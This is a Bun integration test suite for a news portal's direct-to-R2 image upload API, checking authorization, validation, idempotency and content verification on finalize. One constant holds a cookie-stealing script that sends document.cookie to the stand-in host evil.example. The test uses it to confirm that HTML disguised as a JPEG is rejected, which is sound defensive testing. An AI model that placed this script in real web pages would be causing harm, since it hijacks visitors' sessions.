/**
 * Integration tests for the direct-to-R2 presigned upload flow API (Issue
 * #634, epic `news_portal`): `POST .../upload-sessions` (create),
 * `.../{id}/finalize`, `.../{id}/cancel`, against a real PostgreSQL.
 *
 * THIS SUITE PROVES THE FIX for the security-auditor Critical finding on
 * Issue #631: `finalize` must never promote a row past a bare `HEAD` check.
 * The "HTML/JS disguised as a .jpg" tests below are the exact exploit
 * scenario that finding described — they upload real HTML/JS bytes to a
 * fake R2 object whose key/claimed-mime-type says "image/jpeg", and assert
 * `finalize` REJECTS it (422 `UPLOAD_VERIFICATION_FAILED`), the row never
 * reaches `verified`, and no editorial content could ever reference it.
 *
 * Route-level (`invoke()` against the real Astro handlers) for everything
 * that does not require a real R2 round trip: auth/tenant/ABAC guards,
 * request validation, idempotency, not-found/wrong-status/expired-session
 * (all decided from DB state alone, before any R2 call happens).
 *
 * For scenarios that DO require a real R2 round trip (object accepted,
 * object missing, MIME-sniff/checksum rejection), this suite calls
 * `finalizeNewsMediaUploadSession` (the exact function the finalize route
 * thinly wraps — see that module's header) directly, injecting a
 * `Bun.S3Client` pointed at a local fake in-memory S3-compatible HTTP
 * server via `deps.createR2Client` — the route itself has no such seam
 * (Astro route handlers have a fixed signature), so this is the same
 * "inject a real client against a fake server" convention
 * `tests/integration/object-dispatch.integration.test.ts` already
 * established for `sync-storage`, applied at the one layer down where an
 * injection point actually exists.
 *
 * Skipped unless DATABASE_URL is set (see tests/integration/harness.ts).
 */
import {
  afterAll,
  beforeAll,
  beforeEach,
  describe,
  expect,
  test
} from "bun:test";

import {
  applyMigrations,
  createCookieJar,
  getAdminSql,
  integrationEnabled,
  invoke,
  provisionAppRole,
  resetDatabase
} from "./harness";

import { POST as setupInitialize } from "../../src/pages/api/v1/setup/initialize";
import { POST as authLogin } from "../../src/pages/api/v1/auth/login";
import { POST as createUploadSession } from "../../src/pages/api/v1/media/news-images/upload-sessions/index";
import { POST as cancelUploadSession } from "../../src/pages/api/v1/media/news-images/upload-sessions/[id]/cancel";
import { POST as finalizeUploadSessionRoute } from "../../src/pages/api/v1/media/news-images/upload-sessions/[id]/finalize";
import { finalizeNewsMediaUploadSession } from "../../src/modules/news-portal/application/news-media-finalize-upload-session";
import { resolveNewsMediaR2Config } from "../../src/modules/news-portal/domain/news-media-r2-config";
import { getDatabaseClient } from "../../src/lib/database/client";
import { createNewsMediaR2Client } from "../../src/modules/news-portal/infrastructure/news-media-r2-client";
import { hashSessionToken } from "../../src/lib/auth/session-token";

const OWNER_LOGIN = "owner@example.com";
const OWNER_PASSWORD = "integration-test-owner-password";
const R2_BUCKET = "news-media-test-bucket";

type Bootstrap = { tenantId: string; token: string };

async function bootstrap(
  tenantCode = "newsco",
  tenantName = "News Co"
): Promise<Bootstrap> {
  const setup = await invoke<{ data: { tenantId: string } }>(setupInitialize, {
    method: "POST",
    path: "/api/v1/setup/initialize",
    headers: { "content-type": "application/json" },
    body: {
      tenantName,
      tenantCode,
      officeCode: "hq",
      officeName: "HQ",
      ownerLoginIdentifier: `${tenantCode}-${OWNER_LOGIN}`,
      ownerPassword: OWNER_PASSWORD,
      ownerDisplayName: "Owner"
    }
  });
  expect(setup.status).toBe(200);

  const login = await invoke<{ data: { token: string } }>(authLogin, {
    method: "POST",
    path: "/api/v1/auth/login",
    headers: {
      "content-type": "application/json",
      "x-awcms-mini-tenant-id": setup.body.data.tenantId
    },
    body: {
      loginIdentifier: `${tenantCode}-${OWNER_LOGIN}`,
      password: OWNER_PASSWORD
    },
    cookies: createCookieJar()
  });
  expect(login.status).toBe(200);

  return { tenantId: setup.body.data.tenantId, token: login.body.data.token };
}

/** Provisions a second tenant user with only `news_portal.media.read` (no `create`) — used for the ABAC default-deny test. */
async function provisionReadOnlyUser(
  tenantId: string,
  loginIdentifier: string
): Promise<Bootstrap> {
  const password = "integration-test-scoped-password";
  const admin = getAdminSql();
  const passwordHash = await Bun.password.hash(password);

  await admin.begin(async (tx) => {
    await tx.unsafe(`SET LOCAL app.current_tenant_id = '${tenantId}'`);

    const profile = (await tx`
      INSERT INTO awcms_mini_profiles (tenant_id, profile_type, display_name)
      VALUES (${tenantId}, 'person', ${loginIdentifier}) RETURNING id
    `) as { id: string }[];
    const identity = (await tx`
      INSERT INTO awcms_mini_identities (tenant_id, profile_id, login_identifier, password_hash)
      VALUES (${tenantId}, ${profile[0]!.id}, ${loginIdentifier}, ${passwordHash})
      RETURNING id
    `) as { id: string }[];
    const tenantUser = (await tx`
      INSERT INTO awcms_mini_tenant_users (tenant_id, identity_id)
      VALUES (${tenantId}, ${identity[0]!.id}) RETURNING id
    `) as { id: string }[];
    const role = (await tx`
      INSERT INTO awcms_mini_roles (tenant_id, role_code, role_name)
      VALUES (${tenantId}, ${`role_${loginIdentifier}`}, ${loginIdentifier}) RETURNING id
    `) as { id: string }[];

    const permission = (await tx`
      SELECT id FROM awcms_mini_permissions
      WHERE module_key = 'news_portal' AND activity_code = 'media' AND action = 'read'
    `) as { id: string }[];

    await tx`
      INSERT INTO awcms_mini_role_permissions (tenant_id, role_id, permission_id)
      VALUES (${tenantId}, ${role[0]!.id}, ${permission[0]!.id})
    `;

    await tx`
      INSERT INTO awcms_mini_access_assignments (tenant_id, tenant_user_id, role_id)
      VALUES (${tenantId}, ${tenantUser[0]!.id}, ${role[0]!.id})
    `;
  });

  const login = await invoke<{ data: { token: string } }>(authLogin, {
    method: "POST",
    path: "/api/v1/auth/login",
    headers: {
      "content-type": "application/json",
      "x-awcms-mini-tenant-id": tenantId
    },
    body: { loginIdentifier, password },
    cookies: createCookieJar()
  });
  expect(login.status).toBe(200);

  return { tenantId, token: login.body.data.token };
}

function authHeaders(b: Bootstrap): Record<string, string> {
  return {
    "content-type": "application/json",
    "x-awcms-mini-tenant-id": b.tenantId,
    authorization: `Bearer ${b.token}`
  };
}

/** Minimal in-memory fake S3-compatible HTTP server — path-style `/{bucket}/{objectKey}` (confirmed empirically to be what `Bun.S3Client` requests). */
function startFakeR2Server(): {
  server: ReturnType<typeof Bun.serve>;
  put: (objectKey: string, bytes: Uint8Array) => void;
} {
  const store = new Map<string, Uint8Array>();
  const prefix = `/${R2_BUCKET}/`;

  const server = Bun.serve({
    port: 0,
    fetch(request) {
      const url = new URL(request.url);
      if (!url.pathname.startsWith(prefix)) {
        return new Response("not found", { status: 404 });
      }
      const key = url.pathname.slice(prefix.length);
      const bytes = store.get(key);

      if (request.method === "HEAD") {
        if (!bytes) return new Response(null, { status: 404 });
        return new Response(null, {
          status: 200,
          headers: { "content-length": String(bytes.byteLength) }
        });
      }

      if (request.method === "GET") {
        if (!bytes) return new Response(null, { status: 404 });
        const arrayBuffer = bytes.buffer.slice(
          bytes.byteOffset,
          bytes.byteOffset + bytes.byteLength
        ) as ArrayBuffer;
        return new Response(arrayBuffer, { status: 200 });
      }

      return new Response("method not supported by fake server", {
        status: 405
      });
    }
  });

  return {
    server,
    put: (objectKey, bytes) => store.set(objectKey, bytes)
  };
}

const HTML_EXPLOIT_PAYLOAD = new TextEncoder().encode(
  "<html><body><script>fetch('https://evil.example/steal?c='+document.cookie)</script></body></html>"
);
const REAL_JPEG_BYTES = new Uint8Array([
  0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01
]);

const suite = integrationEnabled ? describe : describe.skip;

suite("news media presigned upload session API (Issue #634)", () => {
  const previousEnv = { ...process.env };

  beforeAll(async () => {
    await applyMigrations();
    await provisionAppRole();

    process.env.NEWS_MEDIA_R2_ENABLED = "true";
    process.env.NEWS_MEDIA_R2_ACCOUNT_ID = "test-account";
    process.env.NEWS_MEDIA_R2_ACCESS_KEY_ID = "test-news-media-key";
    process.env.NEWS_MEDIA_R2_SECRET_ACCESS_KEY = "test-news-media-secret";
    process.env.NEWS_MEDIA_R2_BUCKET = R2_BUCKET;
    process.env.NEWS_MEDIA_R2_PUBLIC_BASE_URL = "https://media.example.test";
    process.env.NEWS_MEDIA_R2_PRESIGNED_UPLOAD_TTL_SECONDS = "300";
    process.env.NEWS_MEDIA_R2_MAX_UPLOAD_BYTES = "10485760";
    process.env.NEWS_MEDIA_R2_ALLOWED_MIME_TYPES =
      "image/jpeg,image/png,image/webp,image/gif";
  });

  afterAll(() => {
    process.env = previousEnv;
  });

  beforeEach(async () => {
    await resetDatabase();
  });

  test("create: authenticated owner gets a scoped presigned URL, server-generated object key, never a raw credential", async () => {
    const owner = await bootstrap();

    const response = await invoke<{
      data: {
        objectId: string;
        objectKey: string;
        presignedUrl: string;
        expiresAt: string;
      };
    }>(createUploadSession, {
      method: "POST",
      path: "/api/v1/media/news-images/upload-sessions",
      headers: authHeaders(owner),
      body: { mimeType: "image/jpeg", byteSize: 1024 }
    });

    expect(response.status).toBe(200);
    expect(response.body.data.objectKey).toMatch(
      new RegExp(`^news-media/${owner.tenantId}/\\d{4}/\\d{2}/`)
    );
    expect(response.body.data.presignedUrl).toContain(
      response.body.data.objectKey
    );
    expect(response.body.data.presignedUrl).not.toContain(
      "test-news-media-secret"
    );
    expect(new Date(response.body.data.expiresAt).getTime()).toBeGreaterThan(
      Date.now()
    );
  });

  test("create: rejects a disallowed mime type (image/svg+xml)", async () => {
    const owner = await bootstrap();

    const response = await invoke(createUploadSession, {
      method: "POST",
      path: "/api/v1/media/news-images/upload-sessions",
      headers: authHeaders(owner),
      body: { mimeType: "image/svg+xml", byteSize: 1024 }
    });

    expect(response.status).toBe(400);
    expect((response.body as { error: { code: string } }).error.code).toBe(
      "VALIDATION_ERROR"
    );
  });

  test("create: rejects byteSize larger than NEWS_MEDIA_R2_MAX_UPLOAD_BYTES", async () => {
    const owner = await bootstrap();

    const response = await invoke(createUploadSession, {
      method: "POST",
      path: "/api/v1/media/news-images/upload-sessions",
      headers: authHeaders(owner),
      body: { mimeType: "image/jpeg", byteSize: 999_999_999 }
    });

    expect(response.status).toBe(400);
  });

  test("create: ABAC default-deny for a user without news_portal.media.create", async () => {
    const owner = await bootstrap();
    const readOnly = await provisionReadOnlyUser(
      owner.tenantId,
      "reader@example.com"
    );

    const response = await invoke(createUploadSession, {
      method: "POST",
      path: "/api/v1/media/news-images/upload-sessions",
      headers: authHeaders(readOnly),
      body: { mimeType: "image/jpeg", byteSize: 1024 }
    });

    expect(response.status).toBe(403);
    expect((response.body as { error: { code: string } }).error.code).toBe(
      "ACCESS_DENIED"
    );
  });

  test("create: requires tenant header and auth", async () => {
    const noTenant = await invoke(createUploadSession, {
      method: "POST",
      path: "/api/v1/media/news-images/upload-sessions",
      headers: { "content-type": "application/json" },
      body: { mimeType: "image/jpeg", byteSize: 1024 }
    });
    expect(noTenant.status).toBe(400);

    const owner = await bootstrap("noauthorization");
    const noAuth = await invoke(createUploadSession, {
      method: "POST",
      path: "/api/v1/media/news-images/upload-sessions",
      headers: {
        "content-type": "application/json",
        "x-awcms-mini-tenant-id": owner.tenantId
      },
      body: { mimeType: "image/jpeg", byteSize: 1024 }
    });
    expect(noAuth.status).toBe(401);
  });

  test("finalize: requires Idempotency-Key", async () => {
    const owner = await bootstrap();

    const response = await invoke(finalizeUploadSessionRoute, {
      method: "POST",
      path: "/api/v1/media/news-images/upload-sessions/00000000-0000-0000-0000-000000000000/finalize",
      headers: authHeaders(owner),
      params: { id: "00000000-0000-0000-0000-000000000000" },
      body: {}
    });

    expect(response.status).toBe(400);
    expect((response.body as { error: { code: string } }).error.code).toBe(
      "IDEMPOTENCY_REQUIRED"
    );
  });

  test("finalize: 404 for an unknown upload session id", async () => {
    const owner = await bootstrap();

    const response = await invoke(finalizeUploadSessionRoute, {
      method: "POST",
      path: "/api/v1/media/news-images/upload-sessions/00000000-0000-0000-0000-000000000000/finalize",
      headers: { ...authHeaders(owner), "idempotency-key": "key-1" },
      params: { id: "00000000-0000-0000-0000-000000000000" },
      body: {}
    });

    expect(response.status).toBe(404);
  });

  test("finalize: rejects an expired upload session (created_at + TTL in the past) and marks it failed", async () => {
    process.env.NEWS_MEDIA_R2_PRESIGNED_UPLOAD_TTL_SECONDS = "1";
    const owner = await bootstrap();

    const created = await invoke<{ data: { objectId: string } }>(
      createUploadSession,
      {
        method: "POST",
        path: "/api/v1/media/news-images/upload-sessions",
        headers: authHeaders(owner),
        body: { mimeType: "image/jpeg", byteSize: 1024 }
      }
    );
    expect(created.status).toBe(200);

    // Force created_at into the past so "now" is already past the 1s TTL
    // without a real sleep.
    await getAdminSql().begin(async (tx) => {
      await tx.unsafe(`SET LOCAL app.current_tenant_id = '${owner.tenantId}'`);
      await tx`
        UPDATE awcms_mini_news_media_objects
        SET created_at = now() - interval '1 hour'
        WHERE tenant_id = ${owner.tenantId} AND id = ${created.body.data.objectId}
      `;
    });

    const response = await invoke(finalizeUploadSessionRoute, {
      method: "POST",
      path: `/api/v1/media/news-images/upload-sessions/${created.body.data.objectId}/finalize`,
      headers: { ...authHeaders(owner), "idempotency-key": "expire-key-1" },
      params: { id: created.body.data.objectId },
      body: {}
    });

    expect(response.status).toBe(409);
    expect((response.body as { error: { code: string } }).error.code).toBe(
      "UPLOAD_SESSION_EXPIRED"
    );

    const row = (await getAdminSql()`
      SELECT status FROM awcms_mini_news_media_objects WHERE id = ${created.body.data.objectId}
    `) as { status: string }[];
    expect(row[0]!.status).toBe("failed");

    process.env.NEWS_MEDIA_R2_PRESIGNED_UPLOAD_TTL_SECONDS = "300";
  });

  test("finalize: 409 when the session is not pending_upload (e.g. already cancelled)", async () => {
    const owner = await bootstrap();

    const created = await invoke<{ data: { objectId: string } }>(
      createUploadSession,
      {
        method: "POST",
        path: "/api/v1/media/news-images/upload-sessions",
        headers: authHeaders(owner),
        body: { mimeType: "image/jpeg", byteSize: 1024 }
      }
    );

    const cancel = await invoke(cancelUploadSession, {
      method: "POST",
      path: `/api/v1/media/news-images/upload-sessions/${created.body.data.objectId}/cancel`,
      headers: authHeaders(owner),
      params: { id: created.body.data.objectId }
    });
    expect(cancel.status).toBe(200);

    const finalize = await invoke(finalizeUploadSessionRoute, {
      method: "POST",
      path: `/api/v1/media/news-images/upload-sessions/${created.body.data.objectId}/finalize`,
      headers: { ...authHeaders(owner), "idempotency-key": "after-cancel" },
      params: { id: created.body.data.objectId },
      body: {}
    });
    expect(finalize.status).toBe(409);
    expect((finalize.body as { error: { code: string } }).error.code).toBe(
      "INVALID_STATUS_TRANSITION"
    );
  });

  test("cancel: cannot cancel twice, and cannot cancel someone else's session across tenants", async () => {
    const owner = await bootstrap("cancelco");

    const created = await invoke<{ data: { objectId: string } }>(
      createUploadSession,
      {
        method: "POST",
        path: "/api/v1/media/news-images/upload-sessions",
        headers: authHeaders(owner),
        body: { mimeType: "image/jpeg", byteSize: 1024 }
      }
    );

    const first = await invoke(cancelUploadSession, {
      method: "POST",
      path: `/api/v1/media/news-images/upload-sessions/${created.body.data.objectId}/cancel`,
      headers: authHeaders(owner),
      params: { id: created.body.data.objectId }
    });
    expect(first.status).toBe(200);

    const second = await invoke(cancelUploadSession, {
      method: "POST",
      path: `/api/v1/media/news-images/upload-sessions/${created.body.data.objectId}/cancel`,
      headers: authHeaders(owner),
      params: { id: created.body.data.objectId }
    });
    expect(second.status).toBe(409);
  });

  // -------------------------------------------------------------------
  // Real-R2-round-trip scenarios: `finalizeNewsMediaUploadSession` called
  // directly with a `Bun.S3Client` pointed at a local fake in-memory S3
  // server (the finalize ROUTE itself has no injection seam for this —
  // see file header).
  // -------------------------------------------------------------------

  test("finalize: HTML/JS payload disguised as a .jpg (Issue #631 exploit scenario) is REJECTED — 422 UPLOAD_VERIFICATION_FAILED, row stays failed, never verified", async () => {
    const owner = await bootstrap("exploitco");
    const fake = startFakeR2Server();

    try {
      const created = await invoke<{
        data: { objectId: string; objectKey: string };
      }>(createUploadSession, {
        method: "POST",
        path: "/api/v1/media/news-images/upload-sessions",
        headers: authHeaders(owner),
        body: {
          mimeType: "image/jpeg",
          byteSize: HTML_EXPLOIT_PAYLOAD.byteLength
        }
      });
      expect(created.status).toBe(200);

      // Simulate the browser's direct PUT to R2 — except the "attacker"
      // uploads an HTML/JS payload instead of the JPEG they claimed.
      fake.put(created.body.data.objectKey, HTML_EXPLOIT_PAYLOAD);

      const response = await finalizeNewsMediaUploadSession(
        {
          tenantId: owner.tenantId,
          objectId: created.body.data.objectId,
          tokenHash: hashSessionToken(owner.token),
          idempotencyKey: "exploit-key-1",
          claimedChecksumSha256: null,
          now: new Date()
        },
        {
          sql: getDatabaseClient(),
          config: resolveNewsMediaR2Config(),
          createR2Client: (config) =>
            createNewsMediaR2Client({
              accountId: config.accountId,
              accessKeyId: config.accessKeyId,
              secretAccessKey: config.secretAccessKey,
              bucket: config.bucket,
              endpoint: `http://127.0.0.1:${fake.server.port}`
            })
        }
      );

      expect(response.status).toBe(422);
      const body = (await response.json()) as {
        error: { code: string; details?: { reason?: string } };
      };
      expect(body.error.code).toBe("UPLOAD_VERIFICATION_FAILED");
      expect(body.error.details?.reason).toBe("mime_not_recognized");

      const row = (await getAdminSql()`
        SELECT status FROM awcms_mini_news_media_objects WHERE id = ${created.body.data.objectId}
      `) as { status: string }[];
      expect(row[0]!.status).toBe("failed");
    } finally {
      fake.server.stop(true);
    }
  });

  test("finalize: real JPEG bytes are accepted — status verified, size/checksum recorded from the actual GET", async () => {
    const owner = await bootstrap("acceptco");
    const fake = startFakeR2Server();

    try {
      const created = await invoke<{
        data: { objectId: string; objectKey: string };
      }>(createUploadSession, {
        method: "POST",
        path: "/api/v1/media/news-images/upload-sessions",
        headers: authHeaders(owner),
        body: { mimeType: "image/jpeg", byteSize: REAL_JPEG_BYTES.byteLength }
      });
      expect(created.status).toBe(200);

      fake.put(created.body.data.objectKey, REAL_JPEG_BYTES);

      const response = await finalizeNewsMediaUploadSession(
        {
          tenantId: owner.tenantId,
          objectId: created.body.data.objectId,
          tokenHash: hashSessionToken(owner.token),
          idempotencyKey: "accept-key-1",
          claimedChecksumSha256: null,
          now: new Date()
        },
        {
          sql: getDatabaseClient(),
          config: resolveNewsMediaR2Config(),
          createR2Client: (config) =>
            createNewsMediaR2Client({
              accountId: config.accountId,
              accessKeyId: config.accessKeyId,
              secretAccessKey: config.secretAccessKey,
              bucket: config.bucket,
              endpoint: `http://127.0.0.1:${fake.server.port}`
            })
        }
      );

      expect(response.status).toBe(200);
      const body = (await response.json()) as {
        data: { status: string; sizeBytes: number; checksumSha256: string };
      };
      expect(body.data.status).toBe("verified");
      expect(body.data.sizeBytes).toBe(REAL_JPEG_BYTES.byteLength);

      const hasher = new Bun.CryptoHasher("sha256");
      hasher.update(REAL_JPEG_BYTES);
      expect(body.data.checksumSha256).toBe(hasher.digest("hex"));
    } finally {
      fake.server.stop(true);
    }
  });

  test("finalize: object never actually uploaded to R2 -> rejected object_not_found, never verified", async () => {
    const owner = await bootstrap("missingco");
    const fake = startFakeR2Server();

    try {
      const created = await invoke<{
        data: { objectId: string; objectKey: string };
      }>(createUploadSession, {
        method: "POST",
        path: "/api/v1/media/news-images/upload-sessions",
        headers: authHeaders(owner),
        body: { mimeType: "image/jpeg", byteSize: REAL_JPEG_BYTES.byteLength }
      });
      // Deliberately never call fake.put() — the client never actually PUT.

      const response = await finalizeNewsMediaUploadSession(
        {
          tenantId: owner.tenantId,
          objectId: created.body.data.objectId,
          tokenHash: hashSessionToken(owner.token),
          idempotencyKey: "missing-key-1",
          claimedChecksumSha256: null,
          now: new Date()
        },
        {
          sql: getDatabaseClient(),
          config: resolveNewsMediaR2Config(),
          createR2Client: (config) =>
            createNewsMediaR2Client({
              accountId: config.accountId,
              accessKeyId: config.accessKeyId,
              secretAccessKey: config.secretAccessKey,
              bucket: config.bucket,
              endpoint: `http://127.0.0.1:${fake.server.port}`
            })
        }
      );

      expect(response.status).toBe(422);
      const body = (await response.json()) as {
        error: { details?: { reason?: string } };
      };
      expect(body.error.details?.reason).toBe("object_not_found");
    } finally {
      fake.server.stop(true);
    }
  });

  test("finalize: claimed checksum mismatch (transport corruption) rejects even though bytes sniff as a valid image", async () => {
    const owner = await bootstrap("checksumco");
    const fake = startFakeR2Server();

    try {
      const created = await invoke<{
        data: { objectId: string; objectKey: string };
      }>(createUploadSession, {
        method: "POST",
        path: "/api/v1/media/news-images/upload-sessions",
        headers: authHeaders(owner),
        body: { mimeType: "image/jpeg", byteSize: REAL_JPEG_BYTES.byteLength }
      });

      fake.put(created.body.data.objectKey, REAL_JPEG_BYTES);

      const response = await finalizeNewsMediaUploadSession(
        {
          tenantId: owner.tenantId,
          objectId: created.body.data.objectId,
          tokenHash: hashSessionToken(owner.token),
          idempotencyKey: "checksum-key-1",
          claimedChecksumSha256: "0".repeat(64),
          now: new Date()
        },
        {
          sql: getDatabaseClient(),
          config: resolveNewsMediaR2Config(),
          createR2Client: (config) =>
            createNewsMediaR2Client({
              accountId: config.accountId,
              accessKeyId: config.accessKeyId,
              secretAccessKey: config.secretAccessKey,
              bucket: config.bucket,
              endpoint: `http://127.0.0.1:${fake.server.port}`
            })
        }
      );

      expect(response.status).toBe(422);
      const body = (await response.json()) as {
        error: { details?: { reason?: string } };
      };
      expect(body.error.details?.reason).toBe("checksum_mismatch");
    } finally {
      fake.server.stop(true);
    }
  });

  test("finalize: same Idempotency-Key + same request replays the stored response instead of re-verifying", async () => {
    const owner = await bootstrap("idempotentco");
    const fake = startFakeR2Server();

    try {
      const created = await invoke<{
        data: { objectId: string; objectKey: string };
      }>(createUploadSession, {
        method: "POST",
        path: "/api/v1/media/news-images/upload-sessions",
        headers: authHeaders(owner),
        body: { mimeType: "image/jpeg", byteSize: REAL_JPEG_BYTES.byteLength }
      });
      fake.put(created.body.data.objectKey, REAL_JPEG_BYTES);

      const deps = {
        sql: getDatabaseClient(),
        config: resolveNewsMediaR2Config(),
        createR2Client: (config: ReturnType<typeof resolveNewsMediaR2Config>) =>
          createNewsMediaR2Client({
            accountId: config.accountId,
            accessKeyId: config.accessKeyId,
            secretAccessKey: config.secretAccessKey,
            bucket: config.bucket,
            endpoint: `http://127.0.0.1:${fake.server.port}`
          })
      };

      const first = await finalizeNewsMediaUploadSession(
        {
          tenantId: owner.tenantId,
          objectId: created.body.data.objectId,
          tokenHash: hashSessionToken(owner.token),
          idempotencyKey: "replay-key-1",
          claimedChecksumSha256: null,
          now: new Date()
        },
        deps
      );
      expect(first.status).toBe(200);

      const second = await finalizeNewsMediaUploadSession(
        {
          tenantId: owner.tenantId,
          objectId: created.body.data.objectId,
          tokenHash: hashSessionToken(owner.token),
          idempotencyKey: "replay-key-1",
          claimedChecksumSha256: null,
          now: new Date()
        },
        deps
      );
      expect(second.status).toBe(200);
      expect(await second.json()).toEqual(await first.clone().json());
    } finally {
      fake.server.stop(true);
    }
  });
});
